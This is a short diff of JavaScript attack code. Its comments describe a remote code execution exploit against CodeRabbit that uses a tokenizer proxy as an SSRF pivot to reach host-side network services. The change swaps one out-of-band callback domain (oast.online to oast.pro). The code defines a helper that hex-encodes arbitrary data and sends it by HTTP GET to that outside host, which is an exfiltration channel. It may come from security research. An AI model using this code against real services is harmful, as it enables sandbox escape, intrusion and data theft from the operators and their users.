@@ -1,7 +1,7 @@
 // CodeRabbit RCE — tokenizer-proxy as SSRF PIVOT to the host-side network.
 // The proxy dials from its OWN netns; if that differs from ours, its 127.0.0.1 and
 // link-local routes reach services we cannot. Last escape surface.
-var C = 'd8slpfboeaqn3lacoi50yrw9unawd7fst.oast.online';
+var C = 'd8smjcboeaqn8rtrip106krqtnsgy5atu.oast.pro';
 var http = require('http'), dns = require('dns');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1500), timeout: 8000 }, function () {}).on('error', function () {}); } catch (e) {} };
